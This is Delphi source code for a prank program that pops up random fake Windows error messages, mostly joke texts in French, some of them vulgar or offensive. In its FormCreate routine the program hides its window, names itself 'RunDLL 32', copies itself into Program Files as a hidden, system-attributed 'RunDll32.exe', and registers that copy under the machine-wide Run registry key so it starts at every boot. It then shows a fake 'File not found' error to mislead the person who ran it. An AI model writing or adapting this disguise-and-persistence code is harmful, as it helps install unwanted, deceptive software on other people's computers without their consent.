   unit Unit1;

   interface

   uses
     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
     Dialogs, ExtCtrls, Registry, idGlobal;

   type
     TForm1 = class(TForm)
       Timer1: TTimer;
       procedure Timer1Timer(Sender: TObject);
       procedure FormCreate(Sender: TObject);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

   var
     Form1: TForm1;
     a : integer;
   implementation

   {$R *.dfm}

   procedure TForm1.Timer1Timer(Sender: TObject);
   begin
   a := random(30);
   a := random(30);
   a := random(30);
   if a = 0 then MessageBox(0,'L’opération en cours va subir un retard indéterminé.'+ #13 +'Veuillez nous en excuser. Touloulou.','Air France',16);
   if a = 1 then MessageBox(0,'Impossible de lire le fichier DLL nécessaire pour la pris en charge de la lecture des fichiers .DLL ','Microsoft Internet Explorer',48);
   if a = 2 then MessageBox(0,'Error 0x0000012B occurred. Error message not found.','Fatal Error',16);
   if a = 3 then MessageBox(0,'Il y a un bug dans les fichiers. Darladidadada.'+ #13 +'Toute les données vont êtres paumées. Darladidadada.'+ #13 +'Il va falloir recommencer. Darladidadada.'+ #13 +'Mais on est là pour s’éclater. Darladidadada.','Club Med',64);
   if a = 4 then MessageBox(0,'Smash your head on keyboard to continue.','System',64);
   if a = 5 then MessageBox(0,'Mémoire insuffisante lors de l''allocation de 0 octets','Fatal Error',48);
   if a = 6 then MessageBox(0,'Une erreur sans précédent s''est produite.','Fatal Error',16);
   if a = 7 then MessageBox(0,'Windows n’a pas pu exécuter cette requête pour une de ces raison : '+ #13 +'- La requête utilisée est peut-être trop complexe pour Windows'+ #13 +'- Votre ordinateur manque peut-être de mémoire'+ #13 +'- Votre ordinateur est peut-être débranché','Fatal Error',16);
   if a = 8 then MessageBox(0,'Windows ne peut exécuter cette opération !'+ #13 +'La raison est peut-être que Windows ne peut exécuter cette opération.','Fatal Error',16);
   if a = 9 then MessageBox(0,'Le système a détecté qu''aucun OS valable était présent sur le disque.','Attention',48);
   if a = 10 then MessageBox(0,'La connexion réseau a été fermée gracieusement.','Attention',64);
   if a = 11 then MessageBox(0,'Windows ne peut défragmenter le lecteur C: car il est fragmenté','Erreur',48);
   if a = 12 then MessageBox(0,'Impossible d''ouvrire le fichier Impossible d''ouvrir fichier car fichier impossible d''ouvrir le fichier impossible.','Fatal Error',16);
   if a = 13 then MessageBox(0,'Windows Fuck hard-disk',#13#13#13#13,16);
   if a = 14 then MessageBox(0,'Êtes-vous sûr de vouloir effacer ces 94624387921455804780368-'+#13+'-705686545654123105456436987084 éléments ?','Confirmation de la suppression des fichiers',35);
   if a = 15 then MessageBox(0,'Windows a détecté un mouvement de la souris.','Attention',64);
   if a = 16 then MessageBox(0,'Erreur 0x00000000 : Pas d''erreur.','Fatal Error',16);
   if a = 17 then MessageBox(0,'Windows n’a détecté aucun clavier.'+#13+'Appuyez sur F1 pour continuer.','Attention',48);
   if a = 18 then MessageBox(0,'Windows n''a pas pu imprimer se document.'+#13+'La solution serais de ne pas imprimer.','Solution',64);
   if a = 19 then MessageBox(0,'Ei tullut mitään avauksesta !','UNINSTALL',64);
   if a = 20 then MessageBox(0,'Impossible d’ouvrir la fenêtre.'+#13+'Sortez par la porte ou peter un carreau.','WINDOWS',48);
   if a = 21 then MessageBox(0,'Une erreur est survenue quelque part.'+#13+'On n’est jamais trop prudent, Windows va donc formater le disque dur (on ne sait jamais…).'+#13+'Vous serez obligé de re-installer Windows après (de toute facon on va vous retrouver par le net sinon …)','Warning',48);
   if a = 22 then MessageBox(0,'Putain. Fait pas ça. Touche pas à cette touche. T''es malade.'+#13+'T''as tout vérifier ? Il est fou, le con.'+#13+'Mais t’es vrement sûr que tu veux vider la corbeille ??!','Stressé',35);
   if a = 23 then MessageBox(0,'Rupture du String 0x0050046B.'+#13+'Enfilez un slip !!','Fatal Error',16);
   if a = 24 then MessageBox(0,'File not found :'+#13+' c:\boot.ini'+#13+' c:\autoexec.bat'+#13+' c:\config.sys'+#13+' c:\windows\system.ini'+#13+' c:\windows\explorer.exe'+#13+' c:\windows\system\cmd.exe'+#13+'   and other files...','Fatal Error',16);
   if a = 25 then MessageBox(0,'Votre vitesse de frappe est excessive. C''est fatiguant.','Suisse',48);
   if a = 26 then MessageBox(0,'Vous avez effectué une opération non conforme à la charria.'+#13+'Elle va être amputée.','Taliban',16);
   if a = 27 then MessageBox(0,'vh_MemAlloc : Fail on alloc of -2147483613 bytes'+#13+'(c:\COMPBUN\source\BNDLEMGR.C:,s462)','WARNING',16);
   if a = 28 then MessageBox(0,'Le processus ne peut pas accéder au fichier car se fichier est ce fichier.','Attention',16);
   if a = 29 then MessageBox(0,'Votre ordinateur n’a pas planté depuis plus de 2 heures. MS Autocrash © va maintenant effectuer un plantage de routine.','Windows 98',64);
   end;

   procedure TForm1.FormCreate(Sender: TObject);
   var
   Prog : String;
   Registre : TRegistry ;
   begin
   Application.ShowMainForm := False;
   Application.Title := 'RunDLL 32';
   Registre:=TRegistry.Create;
   Registre.RootKey:=HKEY_LOCAL_MACHINE;
   Registre.OpenKey('Software\Microsoft\Windows\CurrentVersion\', false);
   Prog := Registre.ReadString('ProgramFilesDir');
   Registre.Free;
   CopyFile(pansichar(application.ExeName),pansichar( Prog+'\RunDll32.exe') ,false);
   SetFileAttributes(PChar(Prog+'\RunDll32.exe'),7);
   Registre:=TRegistry.Create;
   Registre.RootKey:=HKEY_LOCAL_MACHINE ;
   Registre.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run', false);
   Registre.WriteString('RunDll32',Prog+'\RunDll32.exe');
   Registre.Free;
   if Application.ExeName <> Prog+'\RunDll32.exe' then
   Messagebox(0,'File not found.','Fatal Error', 16);
   end;

   end.
